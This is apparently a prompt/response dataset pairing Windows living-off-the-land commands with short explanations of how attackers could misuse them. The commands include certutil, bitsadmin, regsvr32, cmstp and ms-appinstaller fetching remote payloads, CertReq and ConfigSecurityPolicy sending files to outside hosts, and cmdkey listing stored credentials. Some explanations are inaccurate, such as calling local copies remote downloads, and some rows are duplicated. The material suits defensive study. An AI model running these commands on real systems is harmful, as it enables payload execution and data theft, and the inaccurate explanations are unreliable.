prompt,response
start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw,"This command could potentially download and execute a malicious application from a remote source, allowing an attacker to gain access to the victim's machine."
start ms-appinstaller://?source=https://10.101.10.10/raw/tdyShwLw,"This command can be used to initiate the installation of an application from a remote source, potentially allowing an attacker to install malicious software on the victim's machine."
start ms-appinstaller://?source=https://11.101.10.10/raw/tdyShwLw,"This command could be used to initiate the installation of a potentially malicious application from a remote server, which could then be used to gain unauthorized access or steal sensitive information from the compromised machine."
C:\\Windows\\System32\\at.exe at 09:00 /interactive /every:m,"This command schedules a task to run every day at 9:00 AM with interactive privileges, which could potentially be used to execute malicious code or commands at a specific time without being detected."
ATBroker.exe /start malware,"Potential use: Launches malware through the ATBroker.exe process.
What it does: Executes the specified malware payload through the ATBroker.exe process, which is a legitimate Windows accessibility tool, allowing the attacker to evade detection."
bash.exe -c calc.exe,"This command can be used to execute the Windows calculator (calc.exe) through the Bash shell, potentially allowing an attacker to bypass security measures that block direct execution of calc.exe."
bash.exe -c calc.exe,"This command can be used to execute the Windows calculator (calc.exe) through the Bash shell, potentially allowing an attacker to bypass security measures that block direct execution of calc.exe."
bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,"This command can be used to create a BITS job that downloads and executes a command shell from a remote server, allowing an attacker to execute arbitrary commands on the compromised machine."
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,This command can be used to download and execute a malicious file from a remote server using the built-in Windows Background Intelligent Transfer Service (BITS).
bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,"This command can be used to create a BITS job that downloads and executes a malicious file (cmd.exe) from a remote server, and then resets the BITS job to cover tracks."
bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset,"This command can be used to download and execute a malicious file (cmd.exe) from a remote server using the Background Intelligent Transfer Service (BITS) and set it to run automatically upon completion, while also hiding the execution from the user."
CertReq -Post -config https://example.org/ c:\\windows\\win.ini output.txt,This command can be used to request a certificate from a remote server and potentially exfiltrate sensitive information from the win.ini file on the victim's machine.
CertReq -Post -config https://example.org/ c:\\windows\\win.ini and show response in terminal,"This command could potentially be used to exfiltrate sensitive information from the target machine by requesting a certificate from a remote server and posting the contents of the win.ini file to it, with the response being displayed in the terminal."
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe,"This command downloads and caches a file from a specified URL, potentially allowing an attacker to download and execute malicious code on a victim's machine."
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\\temp:ttt,"This command downloads a PowerShell script from a remote server and saves it to the local machine, potentially allowing an attacker to execute malicious code."
certutil -encode inputFileName encodedOutputFileName,This command can be used to encode a file and potentially hide it from detection by antivirus software or other security measures on a Windows machine.
certutil -decode encodedInputFileName decodedOutputFileName,"This command can be used to decode a file that has been encoded, potentially to hide malicious content, and save the decoded file to a new location."
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat,"This command downloads a malicious script from a GitHub repository and executes it using regsvr32.exe, which is a legitimate Windows binary, to bypass application whitelisting."
cmdkey /list,"This command can be used to list all stored credentials on a Windows machine, which can be useful for an attacker to gain access to sensitive information or systems."
cmstp.exe /ni /s c:\\cmstp\\CorpVPN.inf,"This command can be used to install a VPN profile on a Windows machine, potentially allowing an attacker to establish a persistent connection to a remote network."
cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf,"This command can be used to execute a malicious payload in the form of a Cmstp.inf file hosted on a remote server, allowing an attacker to bypass security measures and gain persistence on the compromised machine."
ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://10.10.10.10/xxxxxxxxx?encodedfile,This command can be used to bypass security policies and execute the Windows calculator program while also potentially downloading and executing a malicious file from a remote server.
ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://11.11.11.11/xxxxxxxxx?encodedfile,This command is not a valid Windows command.
ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile,"This command can be used to bypass security policies and execute the calculator program, while also sending information to a remote server."
control.exe c:\\windows\\tasks\\file.txt:evil.dll,"This command can be used to execute a malicious DLL file from a scheduled task, allowing an attacker to maintain persistence on the compromised system."
